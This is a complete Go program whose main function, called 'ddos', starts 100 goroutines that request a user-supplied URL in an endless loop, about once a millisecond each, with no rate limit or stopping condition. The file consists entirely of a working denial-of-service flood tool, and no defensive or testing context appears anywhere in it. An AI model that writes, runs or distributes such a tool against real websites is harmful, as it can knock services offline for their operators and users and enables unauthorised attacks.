package main

import (
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"os"
	"runtime"
	"time"
)

var reqNum int64

func main() {
	runtime.GOMAXPROCS(4)
	checkArgs()
	ddos(100)
	fmt.Scanln()
}

func ddos(actorsNum int) {
	for i := 0; i < actorsNum; i++ {
		go infiniteGet(os.Args[1])
	}
}

func infiniteGet(url string) {
	for {
		resp, err := http.Get(url)
		reqNum++
		closeConnction(resp, err)
		time.Sleep(1 * time.Millisecond)
	}
}

func closeConnction(resp *http.Response, err error) {
	if err != nil {
		fmt.Println(err.Error())
	}
	if resp != nil {
		io.Copy(ioutil.Discard, resp.Body)
		resp.Body.Close()
	}
}

func checkArgs() {
	if len(os.Args) != 2 {
		fmt.Fprintf(os.Stderr, "Usage: %s URL\n", os.Args[0])
		os.Exit(1)
	}
}
